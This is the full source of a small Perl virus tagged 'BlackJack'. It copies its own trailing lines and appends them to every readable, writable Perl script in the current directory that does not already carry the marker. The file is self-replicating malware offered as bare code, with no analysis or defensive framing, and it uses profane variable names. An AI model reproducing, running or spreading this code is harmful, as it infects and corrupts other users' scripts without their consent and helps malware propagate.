#!/usr/bin/perl
open(File,$0);
@Vir=<File>;
#BlackJack
@Virus=@Vir[-23...-1];
close(File);
foreach $FileName (<*>)
{
if ((-r $FileName) && (-w $FileName) && (-f $FileName))
{
open(fuck, "$FileName");
@aFucks=<fuck>;
close(fuck);
if ((@aFucks[0] =~ "perl") || (@aFucks[1] =~ "perl"))
{
if ( not (@aFucks[-21] =~ "BlackJack"))
{
open(fuck, ">>$FileName");
print fuck @Virus;
close(fuck);
}
}
}
}
